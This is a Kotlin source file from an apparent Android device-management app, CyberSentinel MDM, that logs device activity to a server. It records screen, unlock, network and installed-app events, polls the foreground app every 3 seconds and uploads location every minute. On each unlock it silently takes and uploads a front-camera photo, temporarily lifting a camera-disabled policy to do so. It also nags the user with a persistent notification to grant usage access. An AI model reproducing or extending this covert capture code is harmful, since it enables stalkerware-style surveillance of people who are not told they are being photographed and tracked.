package com.mdm.command

import android.app.AppOpsManager
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.usage.UsageEvents
import android.app.usage.UsageStatsManager
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.PackageManager
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.net.Uri
import android.os.Build
import android.os.Process
import android.provider.Settings
import androidx.core.app.NotificationCompat
import com.mdm.camera.CameraCapture
import com.mdm.camera.LocationFix
import com.mdm.core.admin.DevicePolicyController
import com.mdm.networking.api.MdmApi
import com.mdm.networking.api.TelemetryBatch
import com.mdm.networking.api.TelemetryEventDto
import com.mdm.networking.auth.AuthRepository
import com.mdm.networking.auth.TokenStore
import dagger.hilt.android.qualifiers.ApplicationContext
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Job
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.MultipartBody
import okhttp3.RequestBody.Companion.toRequestBody
import timber.log.Timber
import javax.inject.Inject
import javax.inject.Singleton

/**
 * Watches the OS for user-facing activity events and ships each one to the
 * server as a TelemetryEvent. The admin's Activity log is fed entirely by
 * what this monitor emits.
 *
 * Event types emitted (kind on the wire / what triggers it):
 *   activity.screen.on       SCREEN_ON
 *   activity.screen.off      SCREEN_OFF
 *   activity.user.present    USER_PRESENT  (lockscreen dismissed → unlocked)
 *   activity.power.connected POWER_CONNECTED
 *   activity.power.disconnected POWER_DISCONNECTED
 *   activity.network.change  CONNECTIVITY_ACTION (any change)
 *   activity.package.added   PACKAGE_ADDED
 *   activity.package.removed PACKAGE_REMOVED
 *   activity.boot            BOOT_COMPLETED (manifest-triggered, mirrored here)
 *   activity.unlock_photo    USER_PRESENT + capture_on_unlock policy true
 *
 * Surveillance hook: on USER_PRESENT, if TokenStore.captureOnUnlock() is set
 * (toggled by the PolicyApplier when the spec carries security.capture_on_unlock),
 * we silently snap the front camera and upload the JPEG, then emit an
 * `activity.unlock_photo` event referencing the file id so the admin's
 * Activity tab can render the thumbnail inline.
 *
 * Lifecycle: [start] from the host foreground service (CommandService),
 * [stop] from onDestroy. The monitor uses the host service's CoroutineScope
 * so its work cancels cleanly when the service dies.
 */
@Singleton
class ActivityMonitor @Inject constructor(
    @ApplicationContext private val context: Context,
    private val api: MdmApi,
    private val auth: AuthRepository,
    private val tokens: TokenStore,
    private val camera: CameraCapture,
    private val locator: LocationFix,
    private val dpm: DevicePolicyController
) {

    private val receivers = mutableListOf<BroadcastReceiver>()
    @Volatile private var hostScope: CoroutineScope? = null
    @Volatile private var lastUnlockPhotoMs: Long = 0L
    @Volatile private var pendingJobs: MutableList<Job> = mutableListOf()
    @Volatile private var lastForegroundPkg: String? = null
    @Volatile private var lastForegroundAtMs: Long = 0L
    private var foregroundJob: Job? = null
    private var locationJob: Job? = null

    fun start(scope: CoroutineScope) {
        if (hostScope != null) return
        hostScope = scope
        runCatching { registerAll() }.onFailure { Timber.w(it, "ActivityMonitor.registerAll partial failure") }
        foregroundJob = scope.launch { runCatching { runForegroundPoller() }.onFailure { Timber.e(it, "foreground poller died") } }
        locationJob   = scope.launch { runCatching { runLocationTicker() }.onFailure { Timber.e(it, "location ticker died") } }
        // Emit a startup beacon so the admin's Activity tab proves the
        // monitor really started. If you don't see this event after install,
        // the FG service is dead or enrollment isn't being detected.
        scope.launch { postEvent("activity.monitor.started", mapOf(
            "receivers" to receivers.size,
            "at" to nowIso()
        )) }
        Timber.i("ActivityMonitor started (${receivers.size} receivers, foreground+location pollers)")
    }

    fun stop() {
        for (r in receivers) runCatching { context.unregisterReceiver(r) }
        receivers.clear()
        pendingJobs.forEach { it.cancel() }
        pendingJobs.clear()
        foregroundJob?.cancel(); foregroundJob = null
        locationJob?.cancel();   locationJob = null
        hostScope = null
    }

    private fun registerAll() {
        register(IntentFilter().apply {
            addAction(Intent.ACTION_SCREEN_ON)
            addAction(Intent.ACTION_SCREEN_OFF)
            addAction(Intent.ACTION_USER_PRESENT)
            addAction(Intent.ACTION_POWER_CONNECTED)
            addAction(Intent.ACTION_POWER_DISCONNECTED)
            addAction(Intent.ACTION_BOOT_COMPLETED)
            addAction("android.net.conn.CONNECTIVITY_CHANGE")
        })
        // Package events require a dataScheme on the filter.
        register(IntentFilter().apply {
            addAction(Intent.ACTION_PACKAGE_ADDED)
            addAction(Intent.ACTION_PACKAGE_REMOVED)
            addAction(Intent.ACTION_PACKAGE_REPLACED)
            addDataScheme("package")
        })
    }

    private fun register(filter: IntentFilter) {
        val recv = object : BroadcastReceiver() {
            override fun onReceive(ctx: Context, intent: Intent) {
                onSystemEvent(intent)
            }
        }
        if (Build.VERSION.SDK_INT >= 33) {
            context.registerReceiver(recv, filter, Context.RECEIVER_NOT_EXPORTED)
        } else {
            @Suppress("UnspecifiedRegisterReceiverFlag")
            context.registerReceiver(recv, filter)
        }
        receivers += recv
    }

    private fun onSystemEvent(intent: Intent) {
        val scope = hostScope ?: return
        val (kind, extra) = mapEvent(intent) ?: return
        // Tracking job so stop() can cancel in-flight posts cleanly.
        val job = scope.launch {
            postEvent(kind, extra)
            if (intent.action == Intent.ACTION_USER_PRESENT) {
                // Always emit a beacon so we can tell from the Activity tab
                // *why* a capture didn't happen — captureOnUnlock false vs.
                // capture errored out. Without this the user sees nothing
                // and assumes the whole pipeline is broken.
                val enabled = tokens.captureOnUnlock()
                if (!enabled) {
                    postEvent("activity.unlock_photo.skipped", mapOf(
                        "reason" to "capture_on_unlock policy is false (no policy with security.capture_on_unlock=true is bound to this device)"
                    ))
                } else {
                    runCatching { captureUnlockPhoto() }
                        .onFailure {
                            Timber.w(it, "unlock photo capture failed")
                            postEvent("activity.unlock_photo.error", mapOf(
                                "error" to (it.message ?: it::class.java.simpleName),
                                "stack" to it.stackTraceToString().take(800)
                            ))
                        }
                }
            }
        }
        pendingJobs.add(job)
        // Trim job list periodically so it doesn't grow forever
        if (pendingJobs.size > 32) pendingJobs.removeAll { !it.isActive }
    }

    private fun mapEvent(intent: Intent): Pair<String, Map<String, Any?>>? = when (intent.action) {
        Intent.ACTION_SCREEN_ON          -> "activity.screen.on" to emptyMap()
        Intent.ACTION_SCREEN_OFF         -> "activity.screen.off" to emptyMap()
        Intent.ACTION_USER_PRESENT       -> "activity.user.present" to emptyMap()
        Intent.ACTION_POWER_CONNECTED    -> "activity.power.connected" to emptyMap()
        Intent.ACTION_POWER_DISCONNECTED -> "activity.power.disconnected" to emptyMap()
        Intent.ACTION_BOOT_COMPLETED     -> "activity.boot" to emptyMap()
        "android.net.conn.CONNECTIVITY_CHANGE" -> "activity.network.change" to currentNetworkSnapshot()
        Intent.ACTION_PACKAGE_ADDED      -> "activity.package.added" to packageInfo(intent)
        Intent.ACTION_PACKAGE_REMOVED    -> "activity.package.removed" to packageInfo(intent)
        Intent.ACTION_PACKAGE_REPLACED   -> "activity.package.replaced" to packageInfo(intent)
        else -> null
    }

    private fun packageInfo(intent: Intent): Map<String, Any?> {
        val pkg = intent.data?.schemeSpecificPart
        return mapOf(
            "package" to pkg,
            "app_label" to pkg?.let { labelFor(it) }
        )
    }

    private fun currentNetworkSnapshot(): Map<String, Any?> {
        return try {
            val cm = context.getSystemService(ConnectivityManager::class.java)
                ?: return mapOf("transport" to "unknown")
            val net = cm.activeNetwork
                ?: return mapOf("transport" to "none", "has_internet" to false)
            val caps = cm.getNetworkCapabilities(net)
                ?: return mapOf("transport" to "none", "has_internet" to false)
            val transport = when {
                caps.hasTransport(NetworkCapabilities.TRANSPORT_WIFI)     -> "wifi"
                caps.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) -> "cellular"
                caps.hasTransport(NetworkCapabilities.TRANSPORT_ETHERNET) -> "ethernet"
                caps.hasTransport(NetworkCapabilities.TRANSPORT_VPN)      -> "vpn"
                else                                                     -> "other"
            }
            val hasInternet = caps.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET) &&
                              caps.hasCapability(NetworkCapabilities.NET_CAPABILITY_VALIDATED)
            val vpn = caps.hasTransport(NetworkCapabilities.TRANSPORT_VPN) ||
                      !caps.hasCapability(NetworkCapabilities.NET_CAPABILITY_NOT_VPN)
            mapOf(
                "transport"   to transport,
                "has_internet" to hasInternet,
                "vpn"         to vpn,
                "link_kbps"   to caps.linkDownstreamBandwidthKbps
            )
        } catch (_: Throwable) { mapOf("transport" to "unknown") }
    }

    private suspend fun postEvent(kind: String, payload: Map<String, Any?>) {
        if (!auth.isEnrolled()) return
        runCatching {
            api.postTelemetry(TelemetryBatch(listOf(
                TelemetryEventDto(
                    kind = kind,
                    occurredAt = nowIso(),
                    data = payload
                )
            )))
        }.onFailure { Timber.v(it, "telemetry post failed for $kind") }
    }

    /**
     * Throttled to once every 8 s — the OS occasionally fires USER_PRESENT
     * twice (e.g. partial unlock attempts), and we don't need a burst of
     * upload requests.
     */
    private suspend fun captureUnlockPhoto() {
        val now = System.currentTimeMillis()
        if (now - lastUnlockPhotoMs < 8_000L) {
            postEvent("activity.unlock_photo.skipped", mapOf(
                "reason" to "throttled (last capture <8s ago)"
            ))
            return
        }
        lastUnlockPhotoMs = now

        postEvent("activity.unlock_photo.attempt", mapOf(
            "device_owner" to dpm.isDeviceOwner(),
            "admin_active" to dpm.isAdminActive()
        ))

        if (dpm.isDeviceOwner()) {
            runCatching { dpm.grantRuntimePermission(context.packageName, android.Manifest.permission.CAMERA) }
                .onFailure { Timber.w(it, "grantRuntimePermission CAMERA failed") }
        }
        // Camera could be policy-disabled by setCameraDisabled(true); briefly
        // lift the disable so this surveillance capture still works, then
        // restore. Window is < 2s.
        val cameraWasDisabled = runCatching { dpm.isCameraDisabled() }.getOrDefault(false)
        if (cameraWasDisabled) runCatching { dpm.setCameraDisabled(false) }
        val res = try {
            camera.capture(CameraCapture.Lens.FRONT, useFlash = false)
        } catch (t: Throwable) {
            // Rethrow as an Error result so we can emit a structured row.
            CameraCapture.CameraResult.Error(t.message ?: t::class.java.simpleName)
        } finally {
            if (cameraWasDisabled) runCatching { dpm.setCameraDisabled(true) }
        }
        if (res is CameraCapture.CameraResult.Error) {
            Timber.w("unlock photo failed: ${res.reason}")
            postEvent("activity.unlock_photo.error", mapOf(
                "reason" to res.reason,
                "lens" to "FRONT",
                "camera_was_disabled" to cameraWasDisabled
            ))
            return
        }
        val success = res as CameraCapture.CameraResult.Success
        val fileName = "unlock_${now}.jpg"
        val body = success.jpeg.toRequestBody("image/jpeg".toMediaTypeOrNull())
        val part = MultipartBody.Part.createFormData("file", fileName, body)
        val kindBody = "unlock_photo".toRequestBody("text/plain".toMediaTypeOrNull())
        val nameBody = fileName.toRequestBody("text/plain".toMediaTypeOrNull())
        val resp = runCatching { api.deviceUpload(part, kindBody, nameBody) }
            .onFailure { Timber.w(it, "unlock photo upload threw") }
            .getOrNull()
        if (resp == null || !resp.isSuccessful) {
            postEvent("activity.unlock_photo.error", mapOf(
                "reason" to "upload http ${resp?.code() ?: "exception"}",
                "lens" to "FRONT"
            ))
            return
        }
        val rec = resp.body()
        if (rec == null) {
            postEvent("activity.unlock_photo.error", mapOf(
                "reason" to "upload returned empty body",
                "lens" to "FRONT"
            ))
            return
        }
        postEvent("activity.unlock_photo", mapOf(
            "file_id" to rec.id,
            "sha256" to rec.sha256,
            "width_px" to success.widthPx,
            "height_px" to success.heightPx,
            "lens" to "FRONT"
        ))
        Timber.i("unlock photo captured + uploaded (file=${rec.id})")
    }

    private fun nowIso(): String =
        java.time.OffsetDateTime.now(java.time.ZoneOffset.UTC).toString()

    // ---------------- foreground app tracking ----------------------------
    // UsageStatsManager.queryEvents requires PACKAGE_USAGE_STATS, granted via
    // Settings → Apps → Special access → Usage data access. Device Owner
    // cannot toggle this op-code directly (UPDATE_APP_OPS_STATS is signature-
    // only) so we poll-with-grace: if the permission isn't granted, the
    // poller no-ops, and we surface a one-shot "request" event so the admin
    // UI can prompt the on-device admin to grant it once.
    private suspend fun runForegroundPoller() {
        var warnedMissing = false
        var firstTick = true
        var ticksSinceLastNudge = 0
        while (true) {
            if (auth.isEnrolled()) {
                if (!hasUsageStatsPermission()) {
                    if (!warnedMissing) {
                        Timber.w("foreground poller: PACKAGE_USAGE_STATS not granted — prompting user via notification + auto-launching Settings")
                        postEvent("activity.permission.needed", mapOf(
                            "permission" to "PACKAGE_USAGE_STATS",
                            "hint" to "Tap the notification on the device, or open Settings → Apps → Special access → Usage data access → CyberSentinel MDM. Required to capture per-app open/close events; cannot be auto-granted by Device Owner (signature-only)."
                        ))
                        showUsageStatsNotification()
                        runCatching { launchUsageStatsSettings() }
                            .onFailure { Timber.w(it, "auto-launching Settings failed") }
                        warnedMissing = true
                        ticksSinceLastNudge = 0
                    } else {
                        // Re-prompt every ~5 minutes so the user can grant
                        // even if they dismissed the initial notification.
                        ticksSinceLastNudge++
                        if (ticksSinceLastNudge > NUDGE_INTERVAL_TICKS) {
                            showUsageStatsNotification()
                            ticksSinceLastNudge = 0
                        }
                    }
                } else {
                    if (warnedMissing) {
                        warnedMissing = false
                        postEvent("activity.permission.granted", mapOf("permission" to "PACKAGE_USAGE_STATS"))
                        clearUsageStatsNotification()
                    }
                    pollForeground(firstTick)
                    firstTick = false
                }
            }
            delay(FOREGROUND_POLL_MS)
        }
    }

    /**
     * Posts a high-priority notification that opens the Usage Access settings
     * directly when tapped. As Device Owner we cannot auto-grant the
     * GET_USAGE_STATS appop (signature-protected), but we can make the grant
     * a single tap rather than a hunt through 4 layers of Settings.
     */
    private fun showUsageStatsNotification() {
        val nm = context.getSystemService(NotificationManager::class.java) ?: return
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val ch = NotificationChannel(
                USAGE_NOTIF_CHANNEL,
                "CyberSentinel — Permission needed",
                NotificationManager.IMPORTANCE_HIGH
            ).apply {
                description = "Prompts to grant the one permission Device Owner can't auto-grant."
                setShowBadge(true)
            }
            nm.createNotificationChannel(ch)
        }
        val intent = Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS).apply {
            data = Uri.fromParts("package", context.packageName, null)
            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        }
        val flags = PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
        val pi = PendingIntent.getActivity(context, 0xCAFE, intent, flags)
        val notif = NotificationCompat.Builder(context, USAGE_NOTIF_CHANNEL)
            .setSmallIcon(android.R.drawable.stat_sys_warning)
            .setContentTitle("Grant Usage Access")
            .setContentText("Tap to enable per-app activity logging for CyberSentinel MDM")
            .setStyle(NotificationCompat.BigTextStyle()
                .bigText("Android requires Usage Access for tracking which apps users open. " +
                         "Tap to open Settings → Usage data access → CyberSentinel MDM → Allow."))
            .setPriority(NotificationCompat.PRIORITY_HIGH)
            .setContentIntent(pi)
            .setAutoCancel(true)
            .setOngoing(true)
            .build()
        nm.notify(USAGE_NOTIF_ID, notif)
    }

    private fun clearUsageStatsNotification() {
        runCatching {
            context.getSystemService(NotificationManager::class.java)?.cancel(USAGE_NOTIF_ID)
        }
    }

    /** Auto-opens the Usage Access settings on first detection — saves a tap. */
    private fun launchUsageStatsSettings() {
        val i = Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS).apply {
            data = Uri.fromParts("package", context.packageName, null)
            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        }
        context.startActivity(i)
    }

    private fun hasUsageStatsPermission(): Boolean {
        return try {
            val ops = context.getSystemService(AppOpsManager::class.java) ?: return false
            val mode = if (Build.VERSION.SDK_INT >= 29) {
                ops.unsafeCheckOpNoThrow(
                    AppOpsManager.OPSTR_GET_USAGE_STATS,
                    Process.myUid(),
                    context.packageName
                )
            } else {
                @Suppress("DEPRECATION")
                ops.checkOpNoThrow(
                    AppOpsManager.OPSTR_GET_USAGE_STATS,
                    Process.myUid(),
                    context.packageName
                )
            }
            mode == AppOpsManager.MODE_ALLOWED
        } catch (_: Throwable) { false }
    }

    private suspend fun pollForeground(firstTick: Boolean) {
        val usm = context.getSystemService(UsageStatsManager::class.java) ?: return
        val now = System.currentTimeMillis()
        // Look back a little further than the poll cadence to avoid missing
        // a transition that happened just before our tick fires.
        val window = (FOREGROUND_POLL_MS * 4)
        val from = maxOf(lastForegroundAtMs - 1_000L, now - window)
        val events = runCatching { usm.queryEvents(from, now) }.getOrNull() ?: return
        var newest: String? = null
        var newestAt: Long = 0L
        val evt = UsageEvents.Event()
        while (events.hasNextEvent()) {
            events.getNextEvent(evt)
            if (evt.eventType == UsageEvents.Event.MOVE_TO_FOREGROUND ||
                evt.eventType == UsageEvents.Event.ACTIVITY_RESUMED) {
                if (evt.timeStamp >= newestAt) {
                    newest = evt.packageName
                    newestAt = evt.timeStamp
                }
            }
        }
        if (newest == null) return
        if (newest == lastForegroundPkg && !firstTick) return
        val prev = lastForegroundPkg
        lastForegroundPkg = newest
        lastForegroundAtMs = newestAt
        // System UI churn (notif panel, status bar) is noise; suppress.
        if (newest.startsWith("com.android.systemui") ||
            newest == "android" ||
            newest == context.packageName) return
        postEvent("activity.app.foreground", mapOf(
            "package" to newest,
            "app_label" to runCatching { labelFor(newest) }.getOrNull(),
            "previous" to prev,
            "at_ms" to newestAt
        ))
    }

    private fun labelFor(pkg: String): String? {
        return try {
            val pm = context.packageManager
            val info = pm.getApplicationInfo(pkg, 0)
            pm.getApplicationLabel(info).toString()
        } catch (_: PackageManager.NameNotFoundException) { null }
    }

    // ---------------- periodic location ticker ---------------------------
    // Heartbeats carry lat/lon already but only the LATEST value lands on
    // the device row. The activity tab wants a *history* — so we emit a
    // dedicated location event every LOCATION_TICK_MS that the admin can
    // replay over time. Each event is a row in the activity log.
    private suspend fun runLocationTicker() {
        // Stagger the first emission so we don't compete with the initial
        // heartbeat burst.
        delay(15_000L)
        while (true) {
            if (auth.isEnrolled()) {
                val fix = runCatching { locator.get(timeoutMs = 5_000L) }.getOrNull()
                if (fix != null) {
                    postEvent("activity.location", mapOf(
                        "latitude"   to fix.latitude,
                        "longitude"  to fix.longitude,
                        "accuracy_m" to fix.accuracyM,
                        "provider"   to fix.provider,
                        "fresh"      to fix.isFresh
                    ))
                }
            }
            delay(LOCATION_TICK_MS)
        }
    }

    private companion object {
        const val FOREGROUND_POLL_MS = 3_000L
        const val LOCATION_TICK_MS = 60_000L
        const val USAGE_NOTIF_ID = 0xCAFF
        const val USAGE_NOTIF_CHANNEL = "mdm_perm_request"
        // 5 min / 3 s = 100 ticks between re-nudges.
        const val NUDGE_INTERVAL_TICKS = 100
    }
}
